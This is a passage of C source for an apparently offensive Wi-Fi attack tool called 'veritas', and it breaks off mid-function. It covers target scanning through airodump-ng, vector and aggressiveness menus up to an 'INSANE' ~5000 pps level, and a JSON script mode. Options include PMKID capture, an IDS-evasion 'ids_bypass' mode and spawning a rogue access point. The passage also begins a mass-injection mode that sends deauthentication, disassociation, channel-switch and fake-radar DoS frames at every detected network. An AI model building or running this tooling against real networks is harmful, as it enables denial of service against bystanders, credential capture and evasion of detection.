    printf("  " C_DIM_GRAY "[" C_RED "Ctrl+C" RST C_DIM_GRAY "]" RST
           " stop   " C_GRAY "TX:" RST C_AQUA "%lu" RST "  " C_GRAY "%s" RST
           "  " C_GRAY "%.0f%%" RST "\n",
           (unsigned long)sent, pps_str, sc);
    printf("\033[J");
    fflush(stdout);

    /* [FIX 37] Stats file write throttled to 1Hz */
    if (d->stats[0] && (now - last_stats_write) >= 1.0) {
      last_stats_write = now;
      FILE *fp = fopen(d->stats, "w");
      if (fp) {
        fprintf(fp,
                "{\"ts\":%.1f,\"elapsed\":%.1f,\"sent\":%lu,\"fail\":%lu,"
                "\"pps\":%.1f,\"tx_ok\":%.1f,\"bssid\":\"%s\",\"ssid\":\"%s\","
                "\"ch\":%d,\"mode\":\"%s\"}\n",
                (double)time(NULL), elapsed, (unsigned long)sent,
                (unsigned long)fail, pps, sc, d->tgt->bssid, d->tgt->ssid,
                d->tgt->channel, MODE_NAMES[d->cfg->mode]);
        fclose(fp);
      }
    }

    usleep_precise(d->refresh);
  }
  free(d);
  return NULL;
}

static pthread_t start_display(config_t *c, target_ap_t *t, double rate,
                               const char *sf) {
  disp_arg_t *a = calloc(1, sizeof(*a));
  a->cfg = c;
  a->tgt = t;
  a->refresh = rate > 0.05 ? rate : 0.1;
  if (sf)
    snprintf(a->stats, MAX_PATH_LEN, "%s", sf);
  pthread_t th;
  pthread_create(&th, NULL, display_thread, a);
  return th;
}

/* ============================================================
 *               SCANNER
 * ============================================================ */

static int detect_mon_ifaces(char out[][MAX_IFACE], int max) {
  int n = 0;
  FILE *fp = popen("iw dev 2>/dev/null", "r");
  if (!fp)
    return 0;
  char line[256], cur[MAX_IFACE] = "";
  while (fgets(line, sizeof(line), fp) && n < max) {
    char *p = line;
    while (*p == ' ' || *p == '\t')
      p++;
    char *nl = strchr(p, '\n');
    if (nl)
      *nl = 0;
    if (strncmp(p, "Interface ", 10) == 0)
      snprintf(cur, MAX_IFACE, "%s", p + 10);
    else if (strncmp(p, "type ", 5) == 0 && cur[0]) {
      if (strcmp(p + 5, "monitor") == 0)
        snprintf(out[n++], MAX_IFACE, "%s", cur);
      cur[0] = 0;
    }
  }
  pclose(fp);
  return n;
}

/* [FIX 42] Scanner with band option */
static int scan_aps(const char *iface, int dur, target_ap_t *aps, int max,
                    const char *band) {
  int cnt = 0;
  char tmpdir[128];
  snprintf(tmpdir, sizeof(tmpdir), "/tmp/vrt_scan_XXXXXX");
  if (!mkdtemp(tmpdir))
    return 0;
  char pfx[200];
  snprintf(pfx, sizeof(pfx), "%s/s", tmpdir);

  pid_t pid = fork();
  if (pid == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 1);
      dup2(dn, 2);
      close(dn);
    }
    /* [FIX 42] Pass band to airodump-ng */
    if (band && band[0])
      execlp("airodump-ng", "airodump-ng", iface, "--band", band, "-w", pfx,
             "--output-format", "csv", "--write-interval", "1", NULL);
    else
      execlp("airodump-ng", "airodump-ng", iface, "-w", pfx, "--output-format",
             "csv", "--write-interval", "1", NULL);
    _exit(1);
  }
  if (pid < 0)
    return 0;

  for (int i = 0; i < dur && !g_stop; i++) {
    int bw = 30, fl = (i + 1) * bw / dur;
    printf("\r  " C_GRAY "[" RST);
    for (int j = 0; j < bw; j++)
      printf(j < fl ? C_BLUE "█" RST : C_DIM_GRAY "░" RST);
    printf(C_GRAY "]" RST " " C_ICE "%d/%ds" RST " %s", i + 1, dur,
           band ? band : "bg");
    fflush(stdout);
    sleep(1);
  }
  printf("\n");
  kill(pid, SIGTERM);
  waitpid(pid, NULL, 0);

  char csv[220];
  snprintf(csv, sizeof(csv), "%s-01.csv", pfx);
  FILE *fp = fopen(csv, "r");
  if (!fp)
    goto cleanup;

  char line[1024];
  bool in_ap = false;
  while (fgets(line, sizeof(line), fp) && cnt < max) {
    char *nl = strchr(line, '\n');
    if (nl)
      *nl = 0;
    if (!line[0])
      continue;
    if (strncmp(line, "BSSID", 5) == 0) {
      in_ap = true;
      continue;
    }
    if (strncmp(line, "Station", 7) == 0)
      break;
    if (!in_ap)
      continue;

    char fld[20][128];
    int nf = 0;
    char *t = line;
    while (nf < 20) {
      char *c = strchr(t, ',');
      int l = c ? (int)(c - t) : (int)strlen(t);
      if (l > 127)
        l = 127;
      memcpy(fld[nf], t, l);
      fld[nf][l] = 0;
      char *s = fld[nf];
      while (*s == ' ')
        memmove(s, s + 1, strlen(s));
      char *e = s + strlen(s) - 1;
      while (e > s && *e == ' ')
        *e-- = 0;
      nf++;
      if (!c)
        break;
      t = c + 1;
    }
    if (nf < 11 || !valid_mac(fld[0]))
      continue;

    /* [FIX 35] Only use fld[13] when nf >= 14 */
    char *essid = "";
    if (nf >= 14)
      essid = fld[13];
    if (!essid[0])
      continue;

    snprintf(aps[cnt].bssid, MAX_MAC_STR, "%.17s", fld[0]);
    snprintf(aps[cnt].ssid, MAX_SSID_LEN + 1, "%.32s", essid);
    aps[cnt].channel = nf > 3 ? atoi(fld[3]) : 1;
    if (aps[cnt].channel < 1)
      aps[cnt].channel = 1;
    aps[cnt].power = nf > 8 ? atoi(fld[8]) : -100;
    if (nf > 5)
      snprintf(aps[cnt].encryption, 16, "%.15s", fld[5]);
    cnt++;
  }
  fclose(fp);

  for (int i = 0; i < cnt - 1; i++)
    for (int j = i + 1; j < cnt; j++)
      if (aps[j].power > aps[i].power) {
        target_ap_t tmp = aps[i];
        aps[i] = aps[j];
        aps[j] = tmp;
      }

cleanup: {
  char pat[220];
  snprintf(pat, sizeof(pat), "%s*", pfx);
  glob_t g;
  if (glob(pat, 0, NULL, &g) == 0) {
    for (size_t i = 0; i < g.gl_pathc; i++)
      remove(g.gl_pathv[i]);
    globfree(&g);
  }
  rmdir(tmpdir);
}
  return cnt;
}

/* ============================================================
 *               EXIT SUMMARY
 * ============================================================ */

/* [FIX 38,39] Proper exit with both ifaces restored */
static void print_summary(const config_t *cfg, const target_ap_t *t) {
  printf("\033[?25h\033[2J\033[H");

  double elapsed = mono_time() - g_start_time;
  uint64_t sent = atomic_load(&g_pkts_sent);
  uint64_t fail = atomic_load(&g_pkts_fail);
  uint64_t total = sent + fail;
  double sc = total > 0 ? (double)sent / total * 100.0 : 0;
  double pps = elapsed > 0 ? (double)sent / elapsed : 0;

  printf("\n  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST
         "\n");
  printf("  ║" C_AQUA BLD
         "         SESSION COMPLETE                    " RST C_DEEP_B "║" RST
         "\n");
  printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Interface " RST "  " C_CYAN "%-34s" RST "║\n",
         cfg->iface);
  printf("  ║ " C_GRAY "Target    " RST "  " C_ICE "%-34s" RST "║\n", t->bssid);
  printf("  ║ " C_GRAY "SSID      " RST "  " C_WHITE "%-34s" RST "║\n",
         t->ssid);
  printf("  ║ " C_GRAY "Channel   " RST "  " C_RED "%d" RST " → " C_GREEN
         "%d" RST "                              ║\n",
         t->channel, cfg->new_ch);
  printf("  ║ " C_GRAY "Duration  " RST "  " C_ICE "%02d:%02d:%02d" RST
         "                          ║\n",
         (int)(elapsed / 3600), (int)(fmod(elapsed, 3600) / 60),
         (int)(fmod(elapsed, 60)));
  printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Packets   " RST "  " C_AQUA "%-34lu" RST "║\n",
         (unsigned long)sent);
  printf("  ║ " C_GRAY "Rate      " RST "  " C_ICE "%.1f pps" RST
         "                          ║\n",
         pps);
  printf("  ║ " C_GRAY "TX OK     " RST "  %s%.1f%%" RST /* [FIX 38] */
         "                              ║\n",
         sc >= 90 ? C_GREEN : C_RED, sc);
  printf("  ║ " C_GRAY "Failures  " RST "  %s%-34lu" RST "║\n",
         fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);
  printf("  " C_DEEP_B "╚══════════════════════════════════════════════╝" RST
         "\n\n");

  /* [FIX 39] Restore both interfaces */
  set_ch(cfg->iface, t->channel);
  if (cfg->dual_radio && cfg->iface2[0])
    set_ch(cfg->iface2, t->channel);
}

/* ============================================================
 *               SIGNAL HANDLER / PREFLIGHT
 * ============================================================ */

static void sig_handler(int s) {
  (void)s;
  g_stop = 1;
}

static bool preflight(void) {
  printf("\n  " C_CYAN BLD "[*] System check..." RST "\n\n");
  struct {
    const char *name;
    bool crit;
  } tools[] = {
      {"iw", true},
      {"airodump-ng", false},
      {"hostapd", false},
  };
  bool ok = true;
  if (getuid() != 0) {
    printf("  " C_RED "[✗] ROOT" RST " ... FAIL\n");
    return false;
  }
  printf("  " C_GREEN "[✓]" RST " ROOT        ... OK\n");

  for (int i = 0; i < 3; i++) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "which %s >/dev/null 2>&1", tools[i].name);
    bool found = system(cmd) == 0;
    char upper[32];
    snprintf(upper, sizeof(upper), "%s", tools[i].name);
    for (char *p = upper; *p; p++)
      *p = toupper(*p);
    if (found)
      printf("  " C_GREEN "[✓]" RST " %-11s ... OK\n", upper);
    else {
      printf("  %s[%s]" RST " %-11s ... %s\n", tools[i].crit ? C_RED : C_YELLOW,
             tools[i].crit ? "✗" : "⚠", upper, tools[i].crit ? "FAIL" : "WARN");
      if (tools[i].crit)
        ok = false;
    }
  }
  printf("\n");
  return ok;
}

/* ============================================================
 *               INPUT HELPERS / MENUS
 * ============================================================ */

static void input_prompt(const char *prompt, char *out, int sz,
                         bool (*vf)(const char *), const char *err,
                         const char *def) {
  while (1) {
    printf("  " C_ELECTRIC "▸" RST " " C_CYAN "%s" RST, prompt);
    if (def && def[0])
      printf(" " C_GRAY "[%s]" RST, def);
    printf(": ");
    fflush(stdout);
    char buf[256];
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *nl = strchr(buf, '\n');
    if (nl)
      *nl = 0;
    char *p = buf;
    while (*p == ' ')
      p++;
    if (!*p && def && def[0])
      p = (char *)def;
    if (!*p || (vf && !vf(p))) {
      printf("     " C_RED "✗ %s" RST "\n", err);
      continue;
    }
    snprintf(out, (size_t)sz, "%.*s", sz - 1, p);
    return;
  }
}

static bool vmc(const char *s) { return valid_mac(s); }
static bool vch(const char *s) { return valid_ch(atoi(s)); }

static void menu_iface(char *out, int sz) {
  printf("\n  " C_CYAN BLD "Interface Selection" RST "\n\n");
  char ifs[16][MAX_IFACE];
  int n = detect_mon_ifaces(ifs, 16);
  if (n == 0) {
    input_prompt("Monitor interface", out, sz, NULL, "Required", "");
    return;
  }
  for (int i = 0; i < n; i++)
    printf("  " C_CYAN "%d" RST ". %s\n", i + 1, ifs[i]);
  printf("\n");
  if (n == 1) {
    snprintf(out, sz, "%s", ifs[0]);
    printf("  Auto: %s\n\n", ifs[0]);
    return;
  }
  while (1) {
    char buf[16];
    printf("  Select [1-%d]: ", n);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    int s = atoi(buf);
    if (s >= 1 && s <= n) {
      snprintf(out, sz, "%s", ifs[s - 1]);
      return;
    }
  }
}

/* [FIX 42] menu_target with band selection */
static void menu_target(const char *iface, target_ap_t *t) {
  printf("\n  " C_CYAN BLD "Target Acquisition" RST "\n\n");
  char buf[32];
  printf("  Scan APs? " C_AQUA "(Y/n)" RST ": ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin))
    exit(0);

  target_ap_t aps[MAX_APS];
  int n = 0;
  if (buf[0] != 'n' && buf[0] != 'N') {
    /* [FIX 42] Ask for band */
    char band[8] = "abg";
    printf("  Band " C_GRAY "[abg=all, bg=2.4, a=5]" RST " " C_GRAY "[abg]" RST
           ": ");
    fflush(stdout);
    char bbuf[16];
    if (fgets(bbuf, sizeof(bbuf), stdin)) {
      char *nl = strchr(bbuf, '\n');
      if (nl)
        *nl = 0;
      char *p = bbuf;
      while (*p == ' ')
        p++;
      if (*p)
        snprintf(band, sizeof(band), "%.7s", p);
    }

    int dur = (strcmp(band, "a") == 0 || strcmp(band, "abg") == 0) ? 15 : 10;
    printf("\n  Scanning (%s, %ds)...\n\n", band, dur);
    n = scan_aps(iface, dur, aps, MAX_APS, band);
  }

  if (n == 0) {
    char b[MAX_MAC_STR], s[MAX_SSID_LEN + 1], c[8];
    input_prompt("BSSID", b, sizeof(b), vmc, "Invalid MAC", "");
    input_prompt("SSID", s, sizeof(s), NULL, "Required", "");
    input_prompt("Channel", c, sizeof(c), vch, "Invalid (1-14/36-165)", "");
    snprintf(t->bssid, MAX_MAC_STR, "%s", b);
    snprintf(t->ssid, MAX_SSID_LEN + 1, "%s", s);
    t->channel = atoi(c);
    return;
  }

  int show = n > 25 ? 25 : n;
  printf("\n  " C_GRAY " #  BSSID              CH  PWR  ENC       SSID" RST
         "\n");
  printf("  " C_DIM_GRAY
         "────────────────────────────────────────────────────────" RST "\n");
  for (int i = 0; i < show; i++) {
    const char *pc = abs(aps[i].power) < 50
                         ? C_GREEN
                         : (abs(aps[i].power) < 70 ? C_YELLOW : C_RED);
    printf("  " C_CYAN "%2d" RST "  %-18s %3d  %s%4d" RST "  %-9s %s\n", i + 1,
           aps[i].bssid, aps[i].channel, pc, aps[i].power, aps[i].encryption,
           aps[i].ssid);
  }
  printf("   0 = Manual\n\n");

  while (1) {
    printf("  Select [0-%d]: ", show);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    int s = atoi(buf);
    if (s == 0) {
      menu_target(iface, t);
      return;
    }
    if (s >= 1 && s <= show) {
      *t = aps[s - 1];
      return;
    }
  }
}

static void menu_vectors(config_t *c) {
  printf("\n  " C_CYAN BLD "Vector Selection" RST "\n\n");
  for (int i = 0; i < VEC_COUNT; i++)
    printf("  " C_CYAN "%2d" RST ". %s\n", i + 1, VEC_NAMES[i]);
  printf("   " C_AQUA "A" RST " = ALL\n\n");
  while (1) {
    char buf[128];
    printf("  Select [1,3,7 or 1-5 or A]: ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *p = buf;
    while (*p == ' ')
      p++;
    char *nl = strchr(p, '\n');
    if (nl)
      *nl = 0;
    if (*p == 'A' || *p == 'a') {
      for (int i = 0; i < VEC_COUNT; i++)
        c->vec_on[i] = true;
      c->nvec = VEC_COUNT;
      return;
    }
    bool sel[VEC_COUNT] = {0};
    bool ok = false;
    char *tk = strtok(p, ",");
    while (tk) {
      while (*tk == ' ')
        tk++;
      char *d = strchr(tk, '-');
      if (d) {
        *d = 0;
        int a = atoi(tk), b = atoi(d + 1);
        for (int x = a; x <= b; x++)
          if (x >= 1 && x <= VEC_COUNT) {
            sel[x - 1] = true;
            ok = true;
          }
      } else {
        int x = atoi(tk);
        if (x >= 1 && x <= VEC_COUNT) {
          sel[x - 1] = true;
          ok = true;
        }
      }
      tk = strtok(NULL, ",");
    }
    if (ok) {
      int cnt = 0;
      for (int i = 0; i < VEC_COUNT; i++) {
        c->vec_on[i] = sel[i];
        if (sel[i])
          cnt++;
      }
      c->nvec = cnt;
      return;
    }
  }
}

static attack_mode_t menu_mode(void) {
  printf("\n  " C_CYAN BLD "Aggressiveness" RST "\n\n");
  struct {
    int n;
    const char *nm;
    const char *c;
    const char *d;
  } m[] = {
      {1, "STEALTH", C_GREEN, "~20 pps"},  {2, "LOW", C_BLUE, "~50 pps"},
      {3, "MEDIUM", C_YELLOW, "~200 pps"}, {4, "HIGH", C_ORANGE, "~500 pps"},
      {5, "INSANE", C_RED, "~5000 pps"},
  };
  for (int i = 0; i < 5; i++)
    printf("  %s%d" RST ". %-8s  %s\n", m[i].c, m[i].n, m[i].nm, m[i].d);
  printf("\n");
  while (1) {
    char buf[16];
    printf("  Level [1-5] " C_GRAY "[3]" RST ": ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *p = buf;
    while (*p == ' ')
      p++;
    if (*p == '\n' || !*p)
      return MODE_MEDIUM;
    int s = atoi(p);
    if (s >= 1 && s <= 5)
      return (attack_mode_t)s;
  }
}

/* ============================================================
 *               JSON PARSER
 * ============================================================ */

static bool jstr(const char *j, const char *k, char *o, int sz) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  if (*p != '"')
    return false;
  p++;
  int i = 0;
  while (*p && *p != '"' && i < sz - 1) {
    if (*p == '\\' && *(p + 1))
      p++;
    o[i++] = *p++;
  }
  o[i] = 0;
  return true;
}

static bool jint(const char *j, const char *k, int *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  *o = atoi(p);
  return true;
}

static bool jdbl(const char *j, const char *k, double *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  *o = atof(p);
  return true;
}

/* [FIX 32] Boolean JSON parser */
static bool jbool(const char *j, const char *k, bool *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  if (strncmp(p, "true", 4) == 0) {
    *o = true;
    return true;
  }
  if (strncmp(p, "false", 5) == 0) {
    *o = false;
    return true;
  }
  /* Also accept 1/0 */
  if (*p == '1') {
    *o = true;
    return true;
  }
  if (*p == '0') {
    *o = false;
    return true;
  }
  return false;
}

static int jarr(const char *j, const char *k, char o[][64], int mx) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return 0;
  p = strchr(p, '[');
  if (!p)
    return 0;
  p++;
  int n = 0;
  while (*p && *p != ']' && n < mx) {
    while (*p && *p != '"' && *p != ']')
      p++;
    if (*p != '"')
      break;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < 63)
      o[n][i++] = *p++;
    o[n][i] = 0;
    if (*p == '"')
      p++;
    n++;
  }
  return n;
}

/* ============================================================
 *               SCRIPT MODE
 * ============================================================ */

/* [FIX 30,31,32] Script mode with validation + rogue + boolean parsing */
static void run_script(const char *path) {
  FILE *fp = fopen(path, "r");
  if (!fp) {
    printf(C_RED "[!] Cannot open: %s" RST "\n", path);
    exit(1);
  }
  fseek(fp, 0, SEEK_END);
  long sz = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  char *j = malloc(sz + 1);
  if (!j) {
    fclose(fp);
    exit(1);
  }
  size_t nread = fread(j, 1, sz, fp);
  j[nread] = 0;
  fclose(fp);

  config_t cfg = {0};
  cfg.mode = MODE_MEDIUM;
  cfg.new_ch = 1;
  strcpy(cfg.client, "ff:ff:ff:ff:ff:ff");
  cfg.refresh_rate = 0.1;
  target_ap_t tgt = {0};

  if (!jstr(j, "interface", cfg.iface, MAX_IFACE)) {
    printf(C_RED "[!] 'interface' required" RST "\n");
    free(j);
    exit(1);
  }
  jstr(j, "target_bssid", tgt.bssid, MAX_MAC_STR);
  jstr(j, "target_ssid", tgt.ssid, MAX_SSID_LEN + 1);
  jint(j, "target_channel", &tgt.channel);
  if (!tgt.channel)
    tgt.channel = 6;
  jint(j, "new_channel", &cfg.new_ch);
  jstr(j, "client_mac", cfg.client, MAX_MAC_STR);
  jint(j, "duration", &cfg.duration);
  jdbl(j, "refresh_rate", &cfg.refresh_rate);
  jstr(j, "stats_file", cfg.stats_file, MAX_PATH_LEN);
  jstr(j, "iface2", cfg.iface2, MAX_IFACE);

  bool script_stress = false, script_5ghz = false;
  jbool(j, "stress_mode", &script_stress);
  jbool(j, "scan_5ghz", &script_5ghz);

  if (script_stress) {
    stress_cfg_t scfg = {0};
    snprintf(scfg.iface, MAX_IFACE, "%.31s", cfg.iface);
    scfg.scan_5ghz = script_5ghz;
    scfg.duration = cfg.duration;
    scfg.mode = MODE_MEDIUM;

    char ms[32];
    if (jstr(j, "mode", ms, sizeof(ms))) {
      for (char *p = ms; *p; p++)
        *p = toupper(*p);
      for (int i = 1; i <= 5; i++)
        if (strcmp(ms, MODE_NAMES[i]) == 0)
          scfg.mode = (attack_mode_t)i;
    }

    char vn[VEC_COUNT][64];
    int nv = jarr(j, "vectors", vn, VEC_COUNT);
    for (int i = 0; i < nv; i++)
      for (int v = 0; v < VEC_COUNT; v++)
        if (strcmp(vn[i], VEC_NAMES[v]) == 0) {
          scfg.vec_on[v] = true;
          scfg.nvec++;
        }
    if (!scfg.nvec) {
      scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
      scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
      scfg.vec_on[VEC_CSA_BEACON] = true;
      scfg.vec_on[VEC_AUTH_DOS] = true;
      scfg.nvec = 4;
    }
    free(j);
    run_stress(&scfg);
    return;
  }

  /* [FIX 32] Boolean options from JSON */
  jbool(j, "log_pmkid", &cfg.log_pmkid);
  jbool(j, "ids_bypass", &cfg.ids_bypass);
  jbool(j, "dual_radio", &cfg.dual_radio);
  jbool(j, "spawn_rogue", &cfg.spawn_rogue);
  jstr(j, "rogue_ssid", cfg.rogue_ssid, MAX_SSID_LEN + 1);

  /* [FIX 31] Validate inputs */
  if (tgt.bssid[0] && !valid_mac(tgt.bssid)) {
    printf(C_RED "[!] Invalid target_bssid: '%s'" RST "\n", tgt.bssid);
    free(j);
    exit(1);
  }
  if (cfg.client[0] && strcmp(cfg.client, "ff:ff:ff:ff:ff:ff") != 0 &&
      !valid_mac(cfg.client)) {
    printf(C_RED "[!] Invalid client_mac: '%s'" RST "\n", cfg.client);
    free(j);
    exit(1);
  }
  if (!valid_ch(cfg.new_ch)) {
    printf(C_RED "[!] Invalid new_channel: %d" RST "\n", cfg.new_ch);
    free(j);
    exit(1);
  }

  char vn[VEC_COUNT][64];
  int nv = jarr(j, "vectors", vn, VEC_COUNT);
  for (int i = 0; i < nv; i++)
    for (int v = 0; v < VEC_COUNT; v++)
      if (strcmp(vn[i], VEC_NAMES[v]) == 0) {
        cfg.vec_on[v] = true;
        cfg.nvec++;
      }
  if (!cfg.nvec) {
    cfg.vec_on[0] = true;
    cfg.nvec = 1;
  }

  char ms[32];
  if (jstr(j, "mode", ms, sizeof(ms))) {
    for (char *p = ms; *p; p++)
      *p = toupper(*p);
    for (int i = 1; i <= 5; i++)
      if (strcmp(ms, MODE_NAMES[i]) == 0)
        cfg.mode = (attack_mode_t)i;
  }
  free(j);

  printf("  " C_CYAN "[SCRIPT] %s → %s ch%d→%d %s (%d vec)" RST "\n", path,
         tgt.bssid, tgt.channel, cfg.new_ch, MODE_NAMES[cfg.mode], cfg.nvec);

  /* [FIX 46] DFS redirect info */
  if (is_dfs_ch(cfg.new_ch))
    printf("  " C_YELLOW
           "[DFS] Redirect to DFS ch %d — extended DoS via CAC delay" RST "\n",
           cfg.new_ch);
  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
    if (is_dfs_ch(tgt.channel))
      printf("  " C_YELLOW
             "[OCA] Target ch %d is DFS — Fake Radar can force CAC/"
             "Non-Occupancy lockout" RST "\n",
             tgt.channel);
    else
      printf("  " C_YELLOW
             "[OCA] Target ch %d is non-DFS — Fake Radar still injects "
             "Measurement Report + vacate CSA" RST "\n",
             tgt.channel);
  }

  set_ch(cfg.iface, tgt.channel);
  usleep_precise(0.3);

  factory_t fac;
  if (!factory_build(&fac, &tgt, cfg.new_ch, cfg.client))
    exit(1);
  engine_t eng;
  engine_init(&eng, &cfg, &fac);

  /* [FIX 30] Start rogue AP in script mode */
  start_rogue(&cfg, &tgt);

  g_start_time = mono_time();
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  pthread_t ch_t = start_ch_lock(&cfg, tgt.channel);
  pthread_t cap_t = start_capture(&cfg, &tgt);
  pthread_t dsp_t = start_display(&cfg, &tgt, cfg.refresh_rate, cfg.stats_file);
  engine_start(&eng);

  if (cfg.duration > 0) {
    double end = mono_time() + cfg.duration;
    while (!g_stop && mono_time() < end)
      usleep_precise(0.5);
    g_stop = 1;
  } else {
    while (!g_stop)
      usleep_precise(0.5);
  }

  engine_stop(&eng);
  pthread_join(ch_t, NULL);
  pthread_join(cap_t, NULL);
  pthread_join(dsp_t, NULL);
  stop_rogue(cfg.iface2);
  print_summary(&cfg, &tgt);
}

/* ============================================================
 *               HELP
 * ============================================================ */

/* [FIX 40] --help handler */
static void print_help(void) {
  printf("%s\n", BANNER);
  printf("Usage:\n");
  printf("  sudo ./veritas                     Interactive mode (single "
         "target)\n");
  printf("  sudo ./veritas --stress            Stress test mode (mass "
         "injection)\n");
  printf("  sudo ./veritas --script <json>     Script/automated mode\n");
  printf("  sudo ./veritas --help              Show this help\n\n");
  printf("Options (interactive mode):\n");
  printf("  --pmkid         Enable PMKID capture\n");
  printf("  --ids-bypass    Enable IDS evasion (jittered injection)\n");
  printf("  --dual <iface>  Use dual radio (second monitor interface)\n");
  printf("  --rogue         Spawn rogue AP on redirect channel\n");
  printf("  --stats <file>  Write live stats JSON to file\n");
  printf("  --export <file> Export audit report to JSON or CSV on exit\n\n");
  printf("Stress test options:\n");
  printf(
      "  --stress        Mass injection mode — inject into ALL detected APs\n");
  printf(
      "  --5ghz          Include 5GHz channels in stress scan/injection\n");
  printf(
      "  --export <file> Export audit report (JSON/CSV) at session completion\n\n");
  printf("Script JSON keys:\n");
  printf(
      "  interface, target_bssid, target_ssid, target_channel, new_channel,\n");
  printf(
      "  client_mac, duration, mode, vectors[], refresh_rate, stats_file,\n");
  printf("  log_pmkid, ids_bypass, dual_radio, iface2, spawn_rogue, "
         "rogue_ssid,\n");
  printf("  stress_mode (bool), scan_5ghz (bool), export_file (string)\n\n");
}

/* ============================================================
 *        STRESS TEST MODE — mdk4-style Mass Injection
 *
 *  Injects selected attack vectors into ALL Wi-Fi signals
 *  captured from the air. No specific target required.
 *
 *  Architecture:
 *    Scanner Thread  → passive beacon sniffer → fills AP pool
 *    Hopper Thread   → cycles channels 2.4GHz (+5GHz)
 *    Injector Thread → for each AP in pool: build+inject OTF
 *    Display Thread  → live TUI with per-AP stats
 * ============================================================ */

#define STRESS_MAX_APS 128
#define STRESS_AGE_SEC 60.0

/* Channel tables */
static const int CH_24[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
static const int CH_5[] = {36,  40,  44,  48,  52,  56,  60,  64,
                           100, 104, 108, 112, 116, 120, 124, 128,
                           132, 136, 140, 149, 153, 157, 161, 165};
#define N_CH_24 13
#define N_CH_5 24

typedef struct {
  uint8_t bssid[6];
  char bssid_str[MAX_MAC_STR];
  char ssid[MAX_SSID_LEN + 1];
  int channel;
  int8_t rssi;
  double last_seen;
  uint64_t tx_count;
} stress_ap_t;

typedef struct {
  stress_ap_t aps[STRESS_MAX_APS];
  int count;
  pthread_mutex_t lock;
} stress_pool_t;

/* Global stress state */
static _Atomic int g_stress_ch = 0;
static _Atomic int g_stress_aps_seen = 0;

static void stress_pool_init(stress_pool_t *p) {
  memset(p, 0, sizeof(*p));
  pthread_mutex_init(&p->lock, NULL);
}

static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
                            const char *ssid, int channel, int8_t rssi) {
  pthread_mutex_lock(&p->lock);

  /* Update existing? */
  for (int i = 0; i < p->count; i++) {
    if (memcmp(p->aps[i].bssid, bssid, 6) == 0) {
      p->aps[i].last_seen = mono_time();
      p->aps[i].channel = channel;
      if (rssi < 0 && rssi > -120)
        p->aps[i].rssi = rssi;
      if (ssid[0] && !p->aps[i].ssid[0])
        snprintf(p->aps[i].ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
      pthread_mutex_unlock(&p->lock);
      return;
    }
  }

  /* Add new */
  if (p->count < STRESS_MAX_APS) {
    stress_ap_t *a = &p->aps[p->count];
    memcpy(a->bssid, bssid, 6);
    format_mac(bssid, a->bssid_str);
    snprintf(a->ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
    a->channel = channel;
    a->rssi = rssi;
    a->last_seen = mono_time();
    a->tx_count = 0;
    p->count++;
    atomic_store(&g_stress_aps_seen, p->count);
  }

  pthread_mutex_unlock(&p->lock);
}

/* Remove stale entries */
static void stress_pool_age(stress_pool_t *p) {
  double now = mono_time();
  pthread_mutex_lock(&p->lock);
  int i = 0;
  while (i < p->count) {
    if (now - p->aps[i].last_seen > STRESS_AGE_SEC) {
      p->aps[i] = p->aps[p->count - 1];
      p->count--;
      atomic_store(&g_stress_aps_seen, p->count);
    } else {
      i++;
    }
  }
  pthread_mutex_unlock(&p->lock);
}

/* Snapshot: copy current pool under lock */
static int stress_pool_snapshot(stress_pool_t *p, stress_ap_t *out, int max) {
  pthread_mutex_lock(&p->lock);
  int n = p->count < max ? p->count : max;
  memcpy(out, p->aps, (size_t)n * sizeof(stress_ap_t));
  pthread_mutex_unlock(&p->lock);
  return n;
}

/* Radiotap dBm Antenna Signal Extractor (bit 5) */
static int8_t parse_radiotap_rssi(const uint8_t *buf, uint16_t rt_len) {
  if (rt_len < 8)
    return -100;
  uint32_t present = 0;
  memcpy(&present, buf + 4, 4);
  present = le32toh(present);

  if (present & (1 << 5)) { /* IEEE80211_RADIOTAP_DBM_ANTSIGNAL */
    int off = 8;
    if (present & (1 << 0))
      off += 8; /* TSFT */
    if (present & (1 << 1))
      off += 1; /* Flags */
    if (present & (1 << 2))
      off += 1; /* Rate */
    if (present & (1 << 3)) {
      if (off % 2 != 0)
        off++;
      off += 4; /* Channel */
    }
    if (present & (1 << 4)) {
